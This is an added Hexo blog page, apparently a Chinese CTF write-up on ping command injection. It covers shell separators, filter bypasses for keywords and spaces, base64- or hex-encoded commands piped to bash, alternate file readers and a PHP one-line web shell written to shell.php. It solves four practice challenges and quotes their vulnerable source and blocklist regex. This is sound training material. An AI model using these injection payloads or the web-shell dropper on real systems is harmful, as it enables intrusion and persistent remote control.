@@ -1,0 +1,163 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>ctf-ping命令执行 | 七里燃</title><script src="https://cdn.bootcss.com/valine/1.4.4/Valine.min.js"></script><link rel="stylesheet" href="/css/arknights.css"><link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/highlight.js/10.1.2/styles/atom-one-dark-reasonable.min.css"><style>@font-face {
+ font-family: BenderLight;
+ src: local('Bender'), url("/font/BenderLight.ttf");
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}</style><meta name="generator" content="Hexo 5.4.0"></head><body><header><nav><a href="/">Home</a><a href="/archives/">Archives</a></nav></header><main><article><div id="post-bg"><div id="post-title"><h1>ctf-ping命令执行</h1><hr></div><div id="post-content"><h1 id="ctf-ping命令执行"><a href="#ctf-ping命令执行" class="headerlink" title="ctf-ping命令执行"></a>ctf-ping命令执行</h1><h2 id="检测是否可以注入"><a href="#检测是否可以注入" class="headerlink" title="检测是否可以注入"></a>检测是否可以注入</h2><p>127.0.0.1;whoami<br>如果存在注入，会有如下结果结果</p>
+<p><code>www-data</code></p>
+<h2 id="管道符"><a href="#管道符" class="headerlink" title="管道符"></a>管道符</h2><p><strong>；</strong></p>
+<p>形式：command1 ; command2</p>
+<p>每个命令按照从左到右的顺序,顺序执行</p>
+<p><strong>|</strong></p>
+<p>形式：command1 | command2</p>
+<p>上一条命令的输出，作为下一条命令参数</p>
+<p><img src="https://qlr-0.gitee.io/hhhh/2021%E5%B9%B43%E6%9C%8830%E6%97%A5/Snipaste_2021-03-25_23-23-51.png" alt="Snipaste_2021-03-25_23-23-51"></p>
+<p><img src="https://qlr-0.gitee.io/hhhh/2021%E5%B9%B43%E6%9C%8830%E6%97%A5/Snipaste_2021-03-25_23-22-25.png" alt="Snipaste_2021-03-25_23-22-25"></p>
+<p><strong>&amp;</strong></p>
+<p>形式：command1 &amp; command2</p>
+<p>放在启动参数后面表示设置此进程为后台进程</p>
+<p>例如：</p>
+<p><code>ping 127.0.0.1 &amp; ls</code></p>
+<p>先执行ls，再执行ping </p>
+<p><img src="https://qlr-0.gitee.io/hhhh/2021%E5%B9%B43%E6%9C%8831%E6%97%A5/Snipaste_2021-03-31_12-50-20.png" alt="Snipaste_2021-03-31_12-50-20"></p>
+<p><strong>&amp;&amp;</strong></p>
+<p>形式：command1 &amp;&amp; command2 [&amp;&amp; command3 …]</p>
+<p>只有在 &amp;&amp; 左边的命令运行成功，&amp;&amp; 右边的命令才会继续执行。</p>
+<p>只要有一个命令运行失败，后面的命令就不会继续执行。</p>
+<p><img src="https://qlr-0.gitee.io/hhhh/2021%E5%B9%B43%E6%9C%8831%E6%97%A5/Snipaste_2021-03-31_12-55-56.png" alt="Snipaste_2021-03-31_12-55-56"></p>
+<p><strong>||</strong></p>
+<p>形式：command1 || command2 [|| command3 …]</p>
+<p>与&amp;&amp;恰恰相反，只有在 &amp;&amp; 左边的命令运行失败，&amp;&amp; 右边的命令才会继续执行。</p>
+<p><img src="https://qlr-0.gitee.io/hhhh/2021%E5%B9%B43%E6%9C%8831%E6%97%A5/Snipaste_2021-03-31_13-01-42.png" alt="Snipaste_2021-03-31_13-01-42"></p>
+<h2 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h2><p>可以用于读取</p>
+<blockquote>
+<p>1.more</p>
+<p>2.cat</p>
+<p>3.tac </p>
+<p>4.head </p>
+<p>5.tail </p>
+<p>6.less </p>
+<p>7.sort</p>
+<p>8.nl</p>
+</blockquote>
+<h4 id="过滤flag"><a href="#过滤flag" class="headerlink" title="过滤flag"></a>过滤flag</h4><p>通过反斜杠或单引号绕过</p>
+<blockquote>
+<p>cat f\lag</p>
+<p>cat fl’’ag</p>
+</blockquote>
+<p>拼接flag</p>
+<blockquote>
+<p>a=fl;b=ag;cat $a$b   </p>
+</blockquote>
+<h6 id="编码绕过："><a href="#编码绕过：" class="headerlink" title="编码绕过："></a>编码绕过：</h6><p>base64编码：</p>
+<blockquote>
+<p>echo Y2F0IGZsYWc=|base64 -d|bash        //cat flag</p>
+</blockquote>
+<p>hex编码：</p>
+<blockquote>
+<p>echo 63617420666C6167 | xxd -r -p|bash      //cat flag</p>
+</blockquote>
+<p><strong>当bash被过滤时，可用sh代替</strong></p>
+<blockquote>
+<p>echo Y2F0IGZsYWc=|base64 -d|sh </p>
+<p>echo 63617420666C6167 | xxd -r -p|sh</p>
+</blockquote>
+<h4 id=""><a href="#" class="headerlink" title=""></a></h4><h4 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h4><p>linux下：</p>
+<blockquote>
+<p>{cat,flag}</p>
+<p>cat${IFS}flag</p>
+<p>cat$IFS$9flag</p>
+<p>cat&lt;flag</p>
+<p>cat&lt;&gt;flag</p>
+<p>a=$’\x20flag’&amp;&amp;cat$a         (\x20转换成字符串就是空格)</p>
+</blockquote>
+<p><img src="https://qlr-0.gitee.io/hhhh/2021%E5%B9%B43%E6%9C%8831%E6%97%A5/Snipaste_2021-03-31_19-39-08.png" alt="Snipaste_2021-03-31_19-39-08"></p>
+<h4 id="通配符绕过："><a href="#通配符绕过：" class="headerlink" title="通配符绕过："></a>通配符绕过：</h4><p>**???**在linux里面可以进行代替字母</p>
+<p>/???/c?t flag</p>
+<p><img src="https://qlr-0.gitee.io/hhhh/2021%E5%B9%B43%E6%9C%8831%E6%97%A5/Snipaste_2021-03-31_19-36-19.png" alt="Snipaste_2021-03-31_19-36-19"></p>
+<p>*****在linux里面可以进行模糊匹配</p>
+<p>cat flag.* *进行模糊匹配php</p>
+<p><img src="https://qlr-0.gitee.io/hhhh/2021%E5%B9%B43%E6%9C%8831%E6%97%A5/Snipaste_2021-03-31_19-35-11.png" alt="Snipaste_2021-03-31_19-35-11"></p>
+<h4 id="写入木马："><a href="#写入木马：" class="headerlink" title="写入木马："></a>写入木马：</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">127.0</span>.<span class="number">0.1</span>;<span class="keyword">echo</span> <span class="string">&quot;&lt;?php @eval(\$_POST[cmd]);?&gt;&quot;</span>&gt;shell.php</span><br><span class="line">    <span class="comment">//@为忽略本行代码报错，\是来对$d进行转义</span></span><br><span class="line">    <span class="comment">//&gt;表示写入</span></span><br></pre></td></tr></table></figure>
+
+<p>然后访问shell.php，再通过蚁剑连接即可。</p>
+<h4 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h4><p>可用<code>&gt;</code>来将要读的文件写入文件中，然后通过访问来得到回显</p>
+<p><img src="https://qlr-0.gitee.io/hhhh/2021%E5%B9%B43%E6%9C%8831%E6%97%A5/Snipaste_2021-03-31_19-27-42.png" alt="Snipaste_2021-03-31_19-27-42"></p>
+<p><img src="https://qlr-0.gitee.io/hhhh/2021%E5%B9%B43%E6%9C%8831%E6%97%A5/Snipaste_2021-03-31_19-30-10.png" alt="Snipaste_2021-03-31_19-30-10"></p>
+<h4 id="花式读取："><a href="#花式读取：" class="headerlink" title="花式读取："></a>花式读取：</h4><p>paste读取文件:</p>
+<blockquote>
+<p>paste flag /etc/passwd</p>
+</blockquote>
+<p><img src="https://qlr-0.gitee.io/hhhh/2021%E5%B9%B43%E6%9C%8831%E6%97%A5/Snipaste_2021-03-31_20-12-50.png" alt="Snipaste_2021-03-31_20-12-50"></p>
+<p>diff读取文件 :</p>
+<blockquote>
+<p>diff flag /etc/passwd</p>
+</blockquote>
+<p><img src="https://qlr-0.gitee.io/hhhh/2021%E5%B9%B43%E6%9C%8831%E6%97%A5/Snipaste_2021-03-31_20-12-17.png" alt="Snipaste_2021-03-31_20-12-17"></p>
+<p>od读取文件</p>
+<blockquote>
+<p>od -a flag</p>
+</blockquote>
+<p><img src="https://qlr-0.gitee.io/hhhh/2021%E5%B9%B43%E6%9C%8831%E6%97%A5/Snipaste_2021-03-31_20-10-03.png" alt="Snipaste_2021-03-31_20-10-03"></p>
+<p>bzmore读取文件:</p>
+<blockquote>
+<p>bzmore flag</p>
+</blockquote>
+<p><img src="https://qlr-0.gitee.io/hhhh/2021%E5%B9%B43%E6%9C%8831%E6%97%A5/Snipaste_2021-03-31_20-09-42.png" alt="Snipaste_2021-03-31_20-09-42"></p>
+<p>bzless读取文件：</p>
+<blockquote>
+<p>bzless flag &amp; echo <code>bzless flag</code></p>
+</blockquote>
+<p><img src="https://qlr-0.gitee.io/hhhh/2021%E5%B9%B43%E6%9C%8831%E6%97%A5/Snipaste_2021-03-31_20-09-13.png" alt="Snipaste_2021-03-31_20-09-13"></p>
+<p>curl读取文件：</p>
+<blockquote>
+<p>curl file://+路径</p>
+<p>例如：curl file:///home/qwe/桌面/flag</p>
+</blockquote>
+<p><img src="https://qlr-0.gitee.io/hhhh/2021%E5%B9%B43%E6%9C%8831%E6%97%A5/Snipaste_2021-03-31_20-08-36.png" alt="Snipaste_2021-03-31_20-08-36"></p>
+<h2 id="练习："><a href="#练习：" class="headerlink" title="练习："></a>练习：</h2><h3 id="ping1"><a href="#ping1" class="headerlink" title="ping1"></a>ping1</h3><h6 id="解法1："><a href="#解法1：" class="headerlink" title="解法1："></a>解法1：</h6><p>先输入<code>127.0.0.1;ls</code></p>
+<p><img src="https://qlr-0.gitee.io/hhhh/2021%E5%B9%B43%E6%9C%8830%E6%97%A5/Snipaste_2021-03-25_18-20-54.png" alt="Snipaste_2021-03-25_18-20-54"></p>
+<p>再输入<code>127.0.0.1;cat index.php</code></p>
+<p><img src="https://qlr-0.gitee.io/hhhh/2021%E5%B9%B43%E6%9C%8830%E6%97%A5/Snipaste_2021-03-25_18-22-56.png" alt="Snipaste_2021-03-25_18-22-56"></p>
+<p>右键查看源码，得到源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">header(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;site&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(!strstr(<span class="variable">$target</span>,<span class="string">&quot;flag&quot;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">            <span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">                <span class="comment">// Windows</span></span><br><span class="line">                <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// *nix</span></span><br><span class="line">                <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for the end user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;别想着拿flag了，我过滤他了，还给他换位置了&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>查看代码：</p>
+<p><code>if(!strstr($target,&quot;flag&quot;))</code>过滤了flag</p>
+<p>代码底下还提示<code>die(&quot;别想着拿flag了，我过滤他了，还给他换位置了&quot;);</code></p>
+<p>返回上级目录查看，发现flag在上上上级目录中</p>
+<p><code>127.0.0.1;ls ../../../</code></p>
+<p><img src="https://qlr-0.gitee.io/hhhh/2021%E5%B9%B43%E6%9C%8830%E6%97%A5/Snipaste_2021-03-25_18-28-58.png" alt="Snipaste_2021-03-25_18-28-58"></p>
+<p>a=”fl”;b=”ag”;c=$a$b;cat ../../../$c用绕过过滤</p>
+<p>最终payload：<code>127.0.0.1;a=&quot;fl&quot;;b=&quot;ag&quot;;c=$a$b;cat ../../../$c</code></p>
+<p>或<code>127.0.0.1;cat /fla\g</code></p>
+<h6 id="解法2："><a href="#解法2：" class="headerlink" title="解法2："></a>解法2：</h6><p>尝试写入木马</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">127.0</span>.<span class="number">0.1</span>;<span class="keyword">echo</span> <span class="string">&quot;&lt;?php @eval(\$_POST[cmd]);?&gt;&quot;</span>&gt;shell.php</span><br><span class="line">    <span class="comment">//@为忽略本行代码报错，\是来对$d进行转义</span></span><br></pre></td></tr></table></figure>
+
+<p>运行shell.php，用蚁剑连接，找到flag</p>
+<h3 id="ping2"><a href="#ping2" class="headerlink" title="ping2"></a>ping2</h3><h6 id="解法1：-1"><a href="#解法1：-1" class="headerlink" title="解法1："></a>解法1：</h6><p><code>127.0.0.1;ls</code></p>
+<p><code>127.0.0.1;cat index.php</code></p>
+<p>源码与ping1差不多，没有flag的相关提示，尝试写入木马<code>127.0.0.1;echo &quot;&lt;?php @eval(\$_POST[cmd]);?&gt;&quot;&gt;shell.php</code></p>
+<p><img src="https://qlr-0.gitee.io/hhhh/2021%E5%B9%B43%E6%9C%8830%E6%97%A5/Snipaste_2021-03-25_21-18-57.png" alt="Snipaste_2021-03-25_21-18-57"></p>
+<h6 id="解法2：-1"><a href="#解法2：-1" class="headerlink" title="解法2："></a>解法2：</h6><p><code>127.0.0.1&amp;&amp;find / -name &quot;f*&quot;</code></p>
+<p><img src="https://qlr-0.gitee.io/hhhh/2021%E5%B9%B43%E6%9C%8830%E6%97%A5/Snipaste_2021-03-25_22-09-51.png" alt="Snipaste_2021-03-25_22-09-51"></p>
+<p><code>127.0.0.1&amp;&amp;cat /tmp/flag</code></p>
+<h3 id="ping3"><a href="#ping3" class="headerlink" title="ping3"></a>ping3</h3><p>与ping1类似，就是增加了对空格的过滤</p>
+<p><code>127.0.0.1&amp;&amp;find$IFS$9/$IFS$9-name$IFS$9&quot;f*&quot;</code></p>
+<p><img src="https://qlr-0.gitee.io/hhhh/2021%E5%B9%B43%E6%9C%8830%E6%97%A5/Snipaste_2021-03-25_22-18-25.png" alt="Snipaste_2021-03-25_22-18-25"></p>
+<p><code>127.0.0.1&amp;&amp;cat$IFS$9/fla\g</code></p>
+<h3 id="ping4"><a href="#ping4" class="headerlink" title="ping4"></a>ping4</h3><p>发现被过滤了好多</p>
+<p>用<code>127.0.0.1 &amp; dir</code></p>
+<p><img src="https://qlr-0.gitee.io/hhhh/2021%E5%B9%B43%E6%9C%8831%E6%97%A5/Snipaste_2021-03-31_20-23-37.png" alt="Snipaste_2021-03-31_20-23-37"></p>
+<p>将备份文件下载下来了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;site&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>,  <span class="variable">$target</span> )) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>最后<code>127.0.0.1 &amp; sort flag </code>读出flag</p>
+<div id="paginator"></div></div><div id="post-footer"><hr><a href="/2021/03/28/gitee+Hexo%20%E6%90%AD%E5%BB%BA%E7%AE%80%E5%8D%95%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/">gitee+Hexo 搭建简单的个人博客 Next →</a><hr></div><div id="bottom-btn"><a id="to-index" href="#post-index" title="index">≡</a><a id="to-top" href="#post-title" title="to top">∧</a></div><div id="Valine"></div><script>new Valine({
+ el: '#Valine'
+ , appId: ''
+ , appKey: ''
+ , placeholder: '此条评论委托企鹅物流发送'
+})</script></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/"> Dr.qrl-0</a></h1><section id="total"><a id="total-archives" href="/archives"><span class="total-title">Archives Total:</span><span class="total-number">12</span></a><div id="total-tags"><span class="total-title">Tags:</span><span class="total-number">2</span></div><div id="total-categories"><span class="total-title">Categories:</span><span class="total-number">2</span></div></section></div><div id="aside-block"></div><footer><nobr><span class="text-title">©</span><span class="text-content">1970 to 2020</span></nobr><wbr><nobr><span class="text-title">ICP</span><span class="text-content">——备案号——</span></nobr><wbr><wbr><nobr>published with&nbsp;<a target="_blank" rel="noopener" href="http://hexo.io">Hexo&nbsp;</a></nobr><wbr><nobr>Theme&nbsp;<a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknight&nbsp;</a></nobr><wbr><nobr>by&nbsp;<a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/arknights.js"></script><script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/10.1.2/highlight.min.js"></script></body></html>
